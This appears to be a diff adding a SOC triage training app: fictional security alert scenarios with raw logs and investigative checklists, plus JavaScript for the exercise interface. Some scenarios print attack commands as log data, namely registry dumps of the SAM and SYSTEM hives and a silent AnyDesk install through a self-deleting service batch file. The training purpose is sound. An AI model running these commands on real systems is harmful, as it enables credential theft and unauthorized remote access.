+  "checklist": [
+   "How many distinct EventRecordIDs are behind the counted events?",
+   "Are the timestamps identical to the millisecond across groups?",
+   "What does the domain controller's own security log show?",
+   "How many collectors forward this log source, and is deduplication configured?",
+   "Does three failures followed by a success at the user's own desk look like an attack?",
+   "When did alerts on this host start, and what changed that day?"
+  ]
+ },
+ {
+  "id": "ALT-2026-0030",
+  "title": "Authentication Failures and Success on Executive Account",
+  "meta": {
+   "Ticket": "INC-2026-0030",
+   "Source": "Cloud IdP / VPN / Endpoint",
+   "Rule": "Repeated Sign-In Failures Followed by Success",
+   "Severity": "High",
+   "Priority": "P2",
+   "Status": "Open",
+   "User": "c.lagman (Director IV)",
+   "MITRE": "T1110.003 / T1078.004"
+  },
+  "logs": [
+   "[Entra ID sign-in log]\n2026-09-21\n02:14 - 02:51  41 failed sign-ins, user c.lagman\n  Error 50126 (invalid username or password)\n  Source IPs: 14 distinct, 9 countries\n  Client app: \"Other clients\" (legacy authentication, no MFA possible)\n02:58  Successful sign-in\n  IP: 112.198.x.x (Globe Telecom mobile, PH)\n  Client app: Browser\n  MFA: satisfied - Authenticator push approved 02:58:41\n  Device: not registered, not compliant\n  Sign-in risk: Medium",
+   "[Account history]\n112.198.x.x: not previously seen on this account\n  (account's usual mobile ranges: 112.204.x.x, 180.190.x.x)\nUnregistered devices previously used by this account: 6 in 90 days\n  (user is known to sign in from personal devices while travelling)\n\nPassword last changed: 2026-09-19 (2 days before)\nLegacy authentication: not blocked in tenant\nConditional access: report-only mode pending rollout",
+   "[Activity after the successful sign-in]\nMailbox rules created: none\nMFA methods registered: none\nMail forwarding changes: none\nFiles accessed in SharePoint: 3 documents, all previously accessed\n  by this user, all within their own division's library\nSign-out: 03:31 (33 minutes)\nSubsequent sign-ins: 08:04 from 112.204.x.x, browser, compliant device",
+   "[What could not be established at triage]\n- Whether the user was awake and working at 02:58. User is on\n  official travel (Cebu) per the division calendar; not contactable\n  until 2026-09-22.\n- Whether the MFA push was approved deliberately or through fatigue:\n  Entra logs record approval, not user intent.\n- The 41 failures came from 14 IPs across 9 countries, consistent\n  with a distributed spray against a published address, but the\n  tenant has no record of spray attempts against other accounts\n  (audit retention for failed legacy auth: 7 days, and the\n  comparison period falls outside it).\n- Device telemetry: the device used at 02:58 is unmanaged, so no\n  endpoint logs exist for it."
+  ],
+  "checklist": [
+   "Do the failures and the success share any source, or are they unrelated?",
+   "Was MFA actually satisfied, and can approval intent be distinguished from fatigue?",
+   "Is the successful source IP consistent with this account's history?",
+   "Did anything persistence-related happen after sign-in?",
+   "Is the user's location and availability known for that hour?",
+   "Which evidence is missing that would settle this either way?"
+  ]
+ },
+ {
+  "id": "ALT-2026-0031",
+  "title": "Privilege Escalation to Domain Admin via Service Account",
+  "meta": {
+   "Ticket": "INC-2026-0031",
+   "Source": "Domain Controller / EDR",
+   "Rule": "Sensitive Group Membership Change",
+   "Severity": "Critical",
+   "Priority": "P1",
+   "Status": "Open",
+   "Asset": "APP-GIS-02 / DC-PH-01",
+   "User": "svc-gisapp",
+   "MITRE": "T1068 / T1098 / T1134"
+  },
+  "logs": [
+   "[EDR - APP-GIS-02, privilege escalation chain]\n21:04:12  w3wp.exe (IIS APPPOOL\\\\gis) -> cmd.exe /c whoami /priv\n            SeImpersonatePrivilege: Enabled\n21:05:38  cmd.exe -> C:\\\\Windows\\\\Temp\\\\pp.exe\n            unsigned, 74 KB, hash unknown to intel sources\n            behaviour: creates named pipe \\\\.\\\\pipe\\\\rpc_1a4f,\n            duplicates token of connecting SYSTEM service\n21:05:41  pp.exe -> cmd.exe  running as NT AUTHORITY\\\\SYSTEM\n21:06:02  cmd.exe -> reg save HKLM\\\\SAM C:\\\\Windows\\\\Temp\\\\s.hiv\n21:06:04  cmd.exe -> reg save HKLM\\\\SYSTEM C:\\\\Windows\\\\Temp\\\\y.hiv",
+   "[Domain Controller - DC-PH-01]\n21:19:44  4624  svc-gisapp  Logon Type 3  from APP-GIS-02  NTLM\n21:19:46  4672  Special privileges assigned: SeDebugPrivilege,\n                SeTakeOwnershipPrivilege\n21:22:10  4728  Member added to security-enabled global group\n                Group: Domain Admins\n                Member: CN=svc-gisapp,OU=ServiceAccounts,DC=xxxdomain\n                Subject: svc-gisapp\n21:22:11  4738  User account management: svc-gisapp\n                PasswordNotRequired set\n21:24:55  4720  A user account was created: helpdesk-svc2\n21:24:57  4728  Member added to Domain Admins: helpdesk-svc2",
+   "[Account and change context]\nsvc-gisapp\n  Purpose: GIS application service account, created 2021\n  Documented rights: read/write to GIS database, log on as a service\n  Group memberships before 21:22: Domain Users, GIS-App-Service\n  Interactive logons in 90 days: 0\n  Logons to a domain controller in 90 days: 0\n\nhelpdesk-svc2\n  No corresponding ticket, no owner, created outside the standard\n  account provisioning workflow\n  Naming mimics helpdesk-svc1 (a legitimate account)\n\nChange tickets covering privileged group changes in this window: none",
+   "[What happened next]\n21:31:02  4624 Type 3  helpdesk-svc2 -> DC-PH-02\n21:33:40  7045 on DC-PH-02: service \"WinDefendUpd\" created\n            binPath: C:\\\\Windows\\\\Temp\\\\svc.exe\n21:40:18  4698 on DC-PH-02: scheduled task \\\\Microsoft\\\\Windows\\\\\n            Diagnosis\\\\SysHealth created, runs svc.exe every 30 min\n22:02:55  Firewall: 10.30.9.14 -> 91.219.x.x:8443  ALLOW\n            out 8,204  in 214,880  (recurring, ~30 min interval)"
+  ],
+  "checklist": [
+   "What privilege did the web application process hold, and how was it abused?",
+   "Is the escalation binary signed or known to any intelligence source?",
+   "Which account was added to Domain Admins, and by whom?",
+   "Does that account's behaviour match its documented purpose?",
+   "Was a new account created, and does it follow the provisioning workflow?",
+   "What persistence and outbound activity followed the escalation?"
+  ]
+ },
+ {
+  "id": "ALT-2026-0032",
+  "title": "Mass Privileged Group Additions Overnight",
+  "meta": {
+   "Ticket": "INC-2026-0032",
+   "Source": "Domain Controller / SIEM",
+   "Rule": "Sensitive Group Membership Change",
+   "Severity": "High",
+   "Priority": "P2",
+   "Status": "Open",
+   "Asset": "DC-PH-01",
+   "User": "svc-identitygov",
+   "MITRE": "T1098"
+  },
+  "logs": [
+   "[Alert]\nRule: alert on EventID 4728/4732/4756 for privileged groups\nTriggered: 2026-09-22 01:07\nVolume: 188 additions across 12 privileged groups in 6 minutes\nSubject account for all: svc-identitygov\nAffected groups: Domain Admins, Server Operators, Backup Operators,\n  Account Operators, and 8 delegated OU admin groups",
+   "[Sample event sequence for one member]\n01:03:22  4729  Member REMOVED from Server Operators\n                Member: CN=adm.tuazon  Subject: svc-identitygov\n01:03:22  4728  Member ADDED to Server Operators\n                Member: CN=adm.tuazon  Subject: svc-identitygov\n\nRemoval and addition share the same second for all 188 members.\n4729 events in the window: 188\n4728 events in the window: 188\nNet membership change across all 12 groups: 0",
+   "[Group membership comparison]\nSnapshot 2026-09-21 23:00 vs 2026-09-22 02:00:\n  Domain Admins:        6 members  ->  6 members  (identical SIDs)\n  Server Operators:     9 members  ->  9 members  (identical SIDs)\n  Backup Operators:     4 members  ->  4 members  (identical SIDs)\n  (all 12 groups identical, member for member)\n\nNo account gained or lost any privilege.",
+   "[Tool and rule context]\nsvc-identitygov: service account for the identity governance platform,\n  documented function includes nightly group reconciliation.\nVendor documentation: reconciliation rewrites group membership by\n  removing and re-adding every member to enforce attribute ordering.\nSchedule: nightly 01:00, since platform go-live 2025-11-04.\n\nDetection rule: matches 4728/4732/4756 only. It does not correlate\nthe paired 4729/4733/4757 removals, and has no exclusion for the\ngovernance service account.\n\nAlert history: this has fired nightly since the rule was deployed on\n2026-09-20. Genuine unauthorized group additions detected: 0.\nNote: ALT-2026-0031's real Domain Admins addition occurred at 21:22,\noutside this nightly window, and was a 4728 with no paired 4729."
+  ],
+  "checklist": [
+   "Is each addition paired with a removal at the same timestamp?",
+   "Compare group membership before and after — did anything actually change?",
+   "Which account performed the changes, and is this its documented function?",
+   "Does the vendor documentation explain the remove-then-add pattern?",
+   "Does the rule correlate removals with additions?",
+   "Would this rule still catch a genuine unauthorized addition?"
+  ]
+ },
+ {
+  "id": "ALT-2026-0033",
+  "title": "Remote Service Creation Installing Remote Access Tool",
+  "meta": {
+   "Ticket": "INC-2026-0033",
+   "Source": "Trend Micro Cloud One Workload Security",
+   "Rule": "Microsoft Windows - Attributes of services modified",
+   "Severity": "Critical",
+   "Priority": "P1",
+   "Status": "Open",
+   "Asset": "xxx-ADMIN-01 (10.6.120.1)",
+   "MITRE": "T1036.004 / T1543.003 / T1021.002 / T1219"
+  },
+  "logs": [
+   "[Integrity Monitoring event - Deep Security]\nLogType: detection\npname: Server & Workload Protection\nendpointHostName: xxx-ADMIN-01.xxx.xxx.xyz\nendpointIp: 10.6.120.1\neventId: 100117 - INTEGRITY_MONITORING_EVENT\nruleName: Microsoft Windows - Attributes of services modified\n          (ATT&CK T1036.004, T1543.003)\nruleId: 1002781\ndetectionType: Service\nfileOperation: Created\nfilePathName: lXDzIghc\neventSourceType: 3 - EVENT_SOURCE_EVENT_LOG\nseverity: 3\nrt: 2026-06-11T17:53:51Z\nmpname: Cloud One - Workload Security\nmpver: Deep Security/50.0.4476",
+   "[The created service, decoded from isEntity]\nkey: lXDzIghc          type: Service\nstartType: 3 (manual)  state: 2 (starting)\n\nbinaryPathName:\n  C:\\\\Windows\\\\system32\\\\cmd.exe /Q /c echo\n    c:\\\\perflogs\\\\anydesk.exe --install c:\\\\perflogs\\\\anydesk\n    --start-with-win --silent\n  ^> \\\\\\\\xxx-ADMIN-01\\\\C$\\\\__output_krYkBNdO 2^>^&1\n  > C:\\\\Windows\\\\VkLgGyDk.bat\n  & C:\\\\Windows\\\\system32\\\\cmd.exe /Q /c C:\\\\Windows\\\\VkLgGyDk.bat\n  & del C:\\\\Windows\\\\VkLgGyDk.bat\n\nService name (lXDzIghc) and batch name (VkLgGyDk) are both random\n8-character strings. Output is redirected to the C$ administrative\nshare and the batch file is deleted after execution.",
+   "[Preceding and following events on xxx-ADMIN-01]\n17:51:08  4624 Type 3  mis-admin  NTLM  from 10.6.120.44 (unmanaged host)\n17:51:09  4672 SeDebugPrivilege, SeBackupPrivilege\n17:52:40  4625 x14 on 6 other servers, same source, same account\n17:53:51  7045 service lXDzIghc created  (this alert)\n17:53:53  Application Control: unrecognized software allowed\n            C:\\\\Windows\\\\VkLgGyDk.bat  (SYSTEM, 50 bytes)\n17:54:31  anydesk.exe installed to c:\\\\perflogs\\\\anydesk\n            --start-with-win  (survives reboot)\n17:56:02  anydesk.exe -> boot.net.anydesk.com:443, then\n            relay-fra-03.anydesk.com:443",
+   "[Environment context]\nAnyDesk: not in the approved software list; MIS uses a different\n  remote support product. No AnyDesk licence held by the agency.\nc:\\\\perflogs: not a normal installation path; writable by SYSTEM\n  and excluded from some AV scan policies by default.\n10.6.120.44: no CMDB entry, no EDR agent, joined the subnet today.\n\nSame service-creation pattern (random name, %COMSPEC%, output to C$,\nself-deleting .bat) detected on 3 other servers within 40 minutes.\nChange tickets covering AnyDesk deployment: none."
+  ],
+  "checklist": [
+   "What does the service binary path actually do when decoded?",
+   "Are the service and batch file names meaningful or randomly generated?",
+   "Why is output redirected to the C$ administrative share?",
+   "What software is being installed, from what path, and is it approved?",
+   "What authentication preceded the service creation, and from where?",
+   "Has the same pattern appeared on other hosts?"
+  ]
+ },
+ {
+  "id": "ALT-2026-0034",
+  "title": "Single Account Authenticating to 400 Hosts Overnight",
+  "meta": {
+   "Ticket": "INC-2026-0034",
+   "Source": "Domain Controller / SIEM",
+   "Rule": "Lateral Movement - Excessive Host Authentication",
+   "Severity": "High",
+   "Priority": "P2",
+   "Status": "Open",
+   "Asset": "412 hosts",
+   "User": "svc-vulnscan",
+   "MITRE": "T1021.002 / T1078"
+  },
+  "logs": [
+   "[Correlation alert]\nRule: single account authenticating to > 25 distinct hosts in 1h\nAccount: svc-vulnscan\nDistinct hosts: 412\nWindow: 2026-09-23 22:04 - 2026-09-24 03:41\nLogon Type: 3 (Network)\nAuthentication: Kerberos\nFailures in window: 0\nAdmin share access (C$, ADMIN$): 412 hosts",
+   "[Per-host activity pattern]\nRepresentative sequence, repeated near-identically on all 412:\n  4624 Type 3  svc-vulnscan from 10.50.1.8\n  5140 Network share accessed: ADMIN$\n  WMI query: Win32_QuickFixEngineering, Win32_Product,\n             Win32_OperatingSystem, Win32_Service\n  Registry read: HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\\n                 CurrentVersion (build, patch level)\n  4634 Logoff\n  Duration per host: 40 - 95 seconds\n\nFiles written to any host: 0\nServices created: 0\nScheduled tasks created: 0\nProcesses executed on targets: 0\nCredential material accessed (LSASS, SAM, NTDS): none",
+   "[Source host and account]\n10.50.1.8 = NESSUS-SCAN-01\n  CMDB: registered scanning appliance, owner MIS Infrastructure\n  EDR: agent installed, healthy, no alerts\n  Outbound external connections in window: plugin feed update only\n\nsvc-vulnscan\n  Documented purpose: credentialed vulnerability assessment\n  Rights: local admin on servers and workstations, by design\n  Restrictions: deny interactive logon, deny RDP, password vaulted\n  Usage pattern: last 12 months, monthly overnight runs",
+   "[Schedule and corroboration]\nCHG-2026-0994 (Approved, Implemented):\n  \"Monthly credentialed vulnerability assessment, all subnets.\n   Window: 23 Sept 22:00 - 24 Sept 06:00.\n   Scanner: NESSUS-SCAN-01 (10.50.1.8). Account: svc-vulnscan.\n   Approved by: ISO. Recurring monthly.\"\n\nNessus scan record: job \"Monthly-All-Subnets\" started 22:03,\ncompleted 03:44, 412 hosts scanned, 0 failed.\nPrevious 11 monthly runs show the same host count and duration.\nThis rule was deployed 2026-09-23 and has fired once: tonight."
+  ],
+  "checklist": [
+   "What did the account actually do on each host — read, or write and execute?",
+   "Were any files, services, or scheduled tasks created on the targets?",
+   "Was credential material accessed anywhere?",
+   "Is the source host a registered appliance, and does the account have a documented purpose?",
+   "Does a change record and a scan job history cover this window?",
+   "Is the per-host duration and uniformity consistent with automation or with hands-on activity?"
+  ]
+ },
+ {
+  "id": "ALT-2026-0035",
+  "title": "Unknown Autorun Entry Found During Threat Hunt",
+  "meta": {
+   "Ticket": "INC-2026-0035",
+   "Source": "Threat Hunt / EDR",
+   "Rule": "Hunt Finding - Unrecognized Autorun",
+   "Severity": "Medium",
+   "Priority": "P3",
+   "Status": "Open",
+   "Asset": "ENG-WKS-0119",
+   "User": "r.bantug",
+   "MITRE": "T1547.001"
+  },
+  "logs": [
+   "[Hunt finding]\nQuery: registry Run/RunOnce values referencing paths outside\n       Program Files, across all endpoints\nResult: 1 host\n\nENG-WKS-0119\nHKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\n  Value name: SysCfgHelper\n  Value data: C:\\\\Users\\\\r.bantug\\\\AppData\\\\Roaming\\\\cfg\\\\sch.exe\n  Last write time: 2024-11-08 14:22 (22 months ago)",
+   "[What exists now]\nC:\\\\Users\\\\r.bantug\\\\AppData\\\\Roaming\\\\cfg\\\\sch.exe : NOT PRESENT\nDirectory C:\\\\Users\\\\r.bantug\\\\AppData\\\\Roaming\\\\cfg\\\\ : empty, exists\nPrefetch entry for sch.exe: not present (prefetch retention exceeded)\nShadow copies on host: oldest 2026-08-30, file not present in any\nBackup of user profile: profile folders excluded from backup policy\n\nThe autorun therefore fails silently at every logon and has done so\nfor an unknown period.",
+   "[Telemetry available for 2024-11-08]\nEDR deployed to this host: 2025-03-14 (4 months after the write)\nSysmon: never deployed to engineering workstations\nWindows Security log retention on host: 30 days (rolled over)\nSIEM ingestion for this host begins: 2025-03-14\nProxy log retention: 90 days\nTherefore: no process, file, or network telemetry exists for the\nperiod when the value was written.",
+   "[Host and user context]\nHost imaged: 2024-10-02, not rebuilt since\nr.bantug: engineering, local administrator on own workstation\n  (approved exception for CAD and instrument software)\nUser recollection: installed several instrument utilities and\n  trial software in late 2024; cannot identify this one by name,\n  and the vendor list is not documented.\n\nNo other host has this value. No known malware family is associated\nwith the value name or path. Nothing in the environment has ever\ncontacted infrastructure attributable to this entry, because there\nis no entry-attributable infrastructure to search for."
+  ],
+  "checklist": [
+   "Does the referenced binary still exist anywhere on the host?",
+   "Can the file be recovered from shadow copies or backups?",
+   "What telemetry exists for the date the value was written?",
+   "Is the value present on any other host?",
+   "Can the user account for the software that created it?",
+   "What would it take to reach a verdict, and is that achievable?"
+  ]
+ },
+ {
+  "id": "ALT-2026-0036",
+  "title": "Worm Detected on Removable Drive, Reported Twice",
+  "meta": {
+   "Ticket": "INC-2026-0036",
+   "Source": "Trend Micro Apex One / Vision One Workbench",
+   "Rule": "Malware Detection / APT-Associated Malware",
+   "Severity": "High",
+   "Priority": "P2",
+   "Status": "Open",
+   "Asset": "10.0.12.126",
+   "User": "juan tamad",
+   "MITRE": "T1091 / T1105"
+  },
+  "logs": [
+   "[Workbench alert 1]\nWB-17776-20250625-00012\n\"Malware associated with a known threat group was detected on an endpoint.\"\n\ndetection_name: Worm.Win32.HIUPAN.ZBKB\ndetection_name: Virus found in file\nfile_sha1: 2DD2E2FD578D64461E89F70CF85224C36FB3A442\nfilename: u2ec.dll\nfullpath: E:\\\\u2ec.dll\nip: 10.0.12.126\ntext: File cleaned\ntext: Real-time Scan\nuser_account: juan tamad",
+   "[Workbench alert 2 - separate ticket, same day]\nWB-17776-20250625-00011\n\"Active APT malware has been discovered in the APT cases we investigated\n and received in 2023 and 2024, all of which are associated with\n corresponding APT groups.\"\n\ndetection_name: Worm.Win32.HIUPAN.ZBKB\ndetection_name: Virus found in file\nfile_sha1: 2DD2E2FD578D64461E89F70CF85224C36FB3A442\nfilename: u2ec.dll\nfullpath: E:\\\\u2ec.dll\nip: 10.0.12.126\ntext: File cleaned\ntext: Real-time Scan\nuser_account: juan tamad\n\nIdentical SHA1, filename, path, host and account to WB-...00012.",
+   "[Drive and host context]\nE:\\\\ on 10.0.12.126 at detection time: removable USB mass storage\n  Vendor ID 0951, Product ID 1666 (Kingston DataTraveler)\n  Serial: 60A44C3F...  First seen on this host: day of detection\n  Same serial previously seen on: 4 other hosts across 2 divisions\n\nHIUPAN family behaviour (vendor description):\n  spreads by copying itself to removable drives, writes a\n  hidden autorun-style loader, and sets the host copy to\n  hidden+system attributes\n\nFiles on E:\\\\ at scan: u2ec.dll (cleaned), plus 3 folders with\n  hidden+system attributes and matching .lnk shortcuts",
+   "[What was and was not checked]\nCleaned: E:\\\\u2ec.dll on this host.\nNot yet checked:\n  - whether a copy exists on the host's local drives\n  - the 4 other hosts that have mounted this USB serial\n  - whether the .lnk shortcuts on E:\\\\ point to the payload\n  - any outbound connections from 10.0.12.126 around detection time\n  - whether the drive was used on air-gapped or OT systems\n\nHost 10.0.12.126: real-time scan enabled, EDR telemetry available,\n  no other detections in 30 days."
+  ],
+  "checklist": [
+   "Are the two workbench alerts separate incidents or one detection reported twice?",
+   "What does this malware family do, and does that change the scope of the response?",
+   "Was the file cleaned from the removable drive only, or from the host as well?",
+   "Which other hosts have mounted this USB serial?",
+   "Do the hidden folders and .lnk files on the drive indicate a wider infection?",
+   "Does the APT-association wording in the second alert change what you do next?"
+  ]
+ },
+ {
+  "id": "ALT-2026-0037",
+  "title": "Scheduled Task Created by Shared Administrative Account",
+  "meta": {
+   "Ticket": "INC-2026-0037",
+   "Source": "Windows Event Logs / EDR",
+   "Rule": "Scheduled Task Creation on Server",
+   "Severity": "Medium",
+   "Priority": "P3",
+   "Status": "Open",
+   "Asset": "APP-LIC-04",
+   "User": "mis-shared-adm",
+   "MITRE": "T1053.005"
+  },
+  "logs": [
+   "[Windows Event ID 4698 - APP-LIC-04]\nTask Name: \\\\Maintenance\\\\LicSyncNightly\nTask Content (Action):\n  Command: C:\\\\Program Files\\\\LicenseManager\\\\lmsync.exe\n  Arguments: -mode full -target 10.20.6.40 -quiet -nolog\nTrigger: Daily 02:30, repeat every 6 hours, no expiry\nRun as: NT AUTHORITY\\\\SYSTEM\nCreator: XXXDOMAIN\\\\mis-shared-adm\nSource Network Address: 10.20.0.44 (MIS-JUMP-01)\nTimestamp: 2026-09-24 23:51:06 +08:00",
+   "[The binary and its arguments]\nlmsync.exe\n  Signed: LicenseManager Systems Inc., valid certificate\n  Path: vendor default installation directory\n  Hash: matches the version in software inventory\n  Present on 6 other licence servers, same version\n\nDocumented arguments (vendor manual):\n  -mode full|delta    -target <host>    -quiet\nThe manual does not document -nolog. Vendor support case opened;\nno response at time of triage.\n\n10.20.6.40: LIC-REPO-02, internal licence repository, legitimate\n  sync target for this application.",
+   "[Account and access context]\nmis-shared-adm\n  Shared administrative account, credentials held in the MIS vault\n  Checked out 2026-09-24 21:40, returned 2026-09-25 00:12\n  Vault records the checkout, not which individual used it\n  Three staff are authorized to check it out\n  All three were rostered for the maintenance window\n\nMIS-JUMP-01: approved privileged access workstation\nSession recording on jump host: not enabled (procured, not deployed)",
+   "[Change and comparison]\nCHG-2026-1002 (Approved): \"Licence server maintenance, APP-LIC-01\n  through 06, 24 Sept 21:00 - 25 Sept 01:00. Patch licence manager\n  to 7.4.2 and verify sync.\"  Implementer field: \"MIS Server Team\".\n\nScheduled tasks on the other 5 licence servers: none created.\nOnly APP-LIC-04 received this task.\n\nNo prior task named LicSyncNightly existed on any licence server.\nThe vendor's recommended sync method is a service, not a task.\nNothing else anomalous on APP-LIC-04: no new accounts, no unusual\noutbound traffic, no other persistence, no failed logons."
+  ],
+  "checklist": [
+   "Is the binary signed, in its expected path, and known to the environment?",
+   "Are all the arguments documented by the vendor?",
+   "Which individual created the task, and can that be established?",
+   "Does an approved change cover the window, and does it name this activity?",
+   "Was the same task created on the other servers in the same change?",
+   "Is there any other anomaly on the host to corroborate a malicious reading?"
+  ]
+ }
+];
+
+const VERDICTS = ['False Positive','Benign Positive','True Positive','Inconclusive'];
+const responses = {};
+let idx = 0;
+let participant = null;   // {sessionId, name, email, listPublicly, startedAt}
+let submitState = {status:'idle', message:''};
+let board = {status:'idle', data:null, error:''};  // public leaderboard cache
+let cameFrom = 'register';                          // where "Back" returns to
+
+/* ---- server calls: google.script.run wrapped as promises ---- */
+let verifiedEmail = '';      // supplied by the server, never typed by the user
+let saveTimer = null;
+let saveState = 'idle';      // idle | saving | saved | error
+
+function srun(fnName){
+  const args = Array.prototype.slice.call(arguments, 1);
+  return new Promise((resolve, reject)=>{
+    if(typeof google === 'undefined' || !google.script || !google.script.run){
+      reject(new Error('This page must be opened from its Apps Script web app URL.'));
+      return;
+    }
+    google.script.run
+      .withSuccessHandler(resolve)
+      .withFailureHandler(err => reject(new Error(err && err.message ? err.message : String(err))))
+      [fnName].apply(null, args);
+  });
+}
+
+function makeSessionId(){
+  const d = new Date();
+  const stamp = d.getFullYear().toString()
+    + String(d.getMonth()+1).padStart(2,'0')
+    + String(d.getDate()).padStart(2,'0')
+    + '-' + String(d.getHours()).padStart(2,'0') + String(d.getMinutes()).padStart(2,'0');
+  const rand = Math.random().toString(36).slice(2,6).toUpperCase();
+  return 'L1-' + stamp + '-' + rand;
+}
+
+/* Progress is written to the server, debounced so typing does not
+   generate a call per keystroke. */
+function persist(){
+  if(!participant) return;
+  saveState = 'saving';
+  updateSaveIndicator();
+  if(saveTimer) clearTimeout(saveTimer);
+  saveTimer = setTimeout(()=>{
+    const payload = {
+      participant: participant,
+      responses: responses,
+      idx: idx,
+      submitted: submitState.status === 'sent'
+    };
+    srun('saveProgress', JSON.stringify(payload))
+      .then(()=>{ saveState = 'saved'; updateSaveIndicator(); })
+      .catch(()=>{ saveState = 'error'; updateSaveIndicator(); });
+  }, 1200);
+}
+
+function updateSaveIndicator(){
+  const n = document.getElementById('saveState');
+  if(!n) return;
+  if(saveState === 'saving'){ n.textContent = 'saving\u2026'; n.className = 'savestate'; }
+  else if(saveState === 'saved'){ n.textContent = 'progress saved'; n.className = 'savestate ok'; }
+  else if(saveState === 'error'){ n.textContent = 'not saved \u2014 check connection'; n.className = 'savestate bad'; }
+  else { n.textContent = ''; n.className = 'savestate'; }
+}
+
+/* Loads the signed-in account and any stored progress for it. */
+function bootstrap(){
+  const view = document.getElementById('registerView');
+  view.style.display = 'block';
+  view.innerHTML = '<div class="gate"><div class="panel"><p class="empty">Loading your account\u2026</p></div></div>';
+
+  srun('getSession').then(s=>{
+    verifiedEmail = s.email || '';
+    if(s.state){
+      try{
+        const data = JSON.parse(s.state);
+        if(data.participant && data.participant.name){
+          participant = data.participant;
+          participant.email = verifiedEmail;
+          Object.keys(data.responses||{}).forEach(k=>{ responses[k] = data.responses[k]; });
+          idx = typeof data.idx === 'number' ? data.idx : 0;
+          if(data.submitted) submitState = {status:'sent', message:'Results already submitted for this session.'};
+          saveState = 'saved';
+        }
+      } catch(e){ /* corrupt state: start fresh */ }
+    }
+    render();
+  }).catch(err=>{
+    view.innerHTML = '';
+    const gate = el('div','gate');
+    const panel = el('div','panel');
+    const h1 = document.createElement('h1'); h1.textContent = 'Cannot reach the training server';
+    const p = el('p','empty');
+    p.textContent = err.message + ' If you opened a downloaded copy of this file, use the web app link supplied by the training administrator instead.';
+    panel.appendChild(h1); panel.appendChild(p);
+    gate.appendChild(panel); view.appendChild(gate);
+  });
+}
+
+function ensureResp(id){
+  if(!responses[id]) responses[id] = {host:'',user:'',process:'',parentProcess:'',cmdline:'',srcip:'',dstip:'',dstport:'',whatHappened:'',evidence:'',related:'',ioc:'',benignExplain:'',verdict:'',severityAssess:'',escalate:'',reason:'',nextAction:'',checked:false,correct:null,key:null};
+  return responses[id];
+}
+
+function sevClass(sev){
+  return 'sev-' + (sev||'Medium').replace(/[^A-Za-z]/g,'');
+}
+
+function el(tag, cls){
+  const e = document.createElement(tag);
+  if(cls) e.className = cls;
+  return e;
+}
+
+function renderTicks(){
+  const wrap = document.getElementById('ticks');
+  wrap.innerHTML = '';
+  SCENARIOS.forEach((s,i)=>{
+    const t = el('div','tick');
+    const r = responses[s.id];
+    if(r && r.checked){ t.classList.add(r.correct ? 'correct' : 'incorrect'); }
+    else if(r && r.verdict){ t.classList.add('answered'); }
+    if(i===idx) t.classList.add('current');
+    t.title = s.title;
+    t.addEventListener('click', ()=>{ saveCurrent(); idx=i; render(); });
+    wrap.appendChild(t);
+  });
+}
+
+function saveCurrent(){
+  if(document.getElementById('summaryView').style.display !== 'none') return;
+  const s = SCENARIOS[idx];
+  const r = ensureResp(s.id);
+  const g = id => document.getElementById(id);
+  ['host','user','process','parentProcess','cmdline','srcip','dstip','dstport','whatHappened','evidence','related','ioc','benignExplain','severityAssess','reason','nextAction'].forEach(f=>{
+    const node = g(f);
+    if(node) r[f] = node.value;
+  });
+  const vChecked = document.querySelector('input[name="verdict"]:checked');
+  r.verdict = vChecked ? vChecked.value : r.verdict;
+  const eChecked = document.querySelector('input[name="escalate"]:checked');
+  r.escalate = eChecked ? eChecked.value : r.escalate;
+  persist();
+}
+
+function buildField(labelText, id, type, value){
+  const wrap = el('div','field');
+  const label = el('label'); label.setAttribute('for',id); label.textContent = labelText;
+  wrap.appendChild(label);
+  let input;
+  if(type==='textarea'){ input = el('textarea'); }
+  else { input = el('input'); input.type='text'; }
+  input.id = id; input.value = value||'';
+  input.addEventListener('input', ()=>{ input.classList.remove('invalid'); });
+  wrap.appendChild(input);
+  return wrap;
+}
+
+function renderScenario(){
+  document.getElementById('summaryView').style.display = 'none';
+  document.getElementById('scenarioView').style.display = 'block';
+  const s = SCENARIOS[idx];
+  const r = ensureResp(s.id);
+  document.getElementById('caseCounter').textContent = 'Case ' + String(idx+1).padStart(2,'0') + ' / ' + SCENARIOS.length;
+  const checkedCount = Object.values(responses).filter(x=>x.checked).length;
+  const correctCount = Object.values(responses).filter(x=>x.checked && x.correct).length;
+  document.getElementById('scoreCounter').textContent = checkedCount ? ('Checked ' + checkedCount + ' \u00b7 ' + correctCount + ' correct') : '';
+  renderTicks();
+
+  const view = document.getElementById('scenarioView');
+  view.innerHTML = '';
+
+  // Evidence panel
+  const evPanel = el('div','panel');
+  const tbar = el('div','titlebar');
+  const titleEl = el('div','scen-title'); titleEl.textContent = s.id + ' \u2014 ' + s.title;
+  const badge = el('span','sev-badge ' + sevClass(s.meta.Severity)); badge.textContent = s.meta.Severity || '';
+  tbar.appendChild(titleEl); tbar.appendChild(badge);
+  evPanel.appendChild(tbar);
+
+  const metaGrid = el('div','meta-grid');
+  Object.keys(s.meta).forEach(k=>{
+    if(k==='Severity') return;
+    const item = el('div','meta-item');
+    const kEl = el('span','k'); kEl.textContent = k;
+    const vEl = el('span','v'); vEl.textContent = s.meta[k];
+    item.appendChild(kEl); item.appendChild(vEl);
+    metaGrid.appendChild(item);
+  });
+  evPanel.appendChild(metaGrid);
+  view.appendChild(evPanel);
+
+  // Raw log panel
+  const logPanel = el('div','panel');
+  const logH = el('h2'); logH.textContent = 'RAW LOG';
+  logPanel.appendChild(logH);
+  s.logs.forEach(txt=>{
+    const pre = el('pre','logblock');
+    pre.textContent = txt;
+    logPanel.appendChild(pre);
+  });
+  const details = document.createElement('details'); details.className='checklist';
+  const summary = document.createElement('summary'); summary.textContent = 'Investigative checklist (expand for guidance)';
+  details.appendChild(summary);
+  const ul = el('ul');
+  s.checklist.forEach(q=>{ const li=document.createElement('li'); li.textContent=q; ul.appendChild(li); });
+  details.appendChild(ul);
+  logPanel.appendChild(details);
+  view.appendChild(logPanel);
+
+  // Form panel
+  const formPanel = el('div','panel');
+  const formH = el('h2'); formH.textContent = 'YOUR TRIAGE';
+  formPanel.appendChild(formH);
+
+  const grid2 = el('div','grid2');
+  [['Host','host'],['User','user'],['Process','process'],['Parent Process','parentProcess'],
+   ['Source IP','srcip'],['Destination IP','dstip'],['Destination Port','dstport']].forEach(([lbl,id])=>{
+    grid2.appendChild(buildField(lbl,id,'text',r[id]));
+  });
+  formPanel.appendChild(grid2);
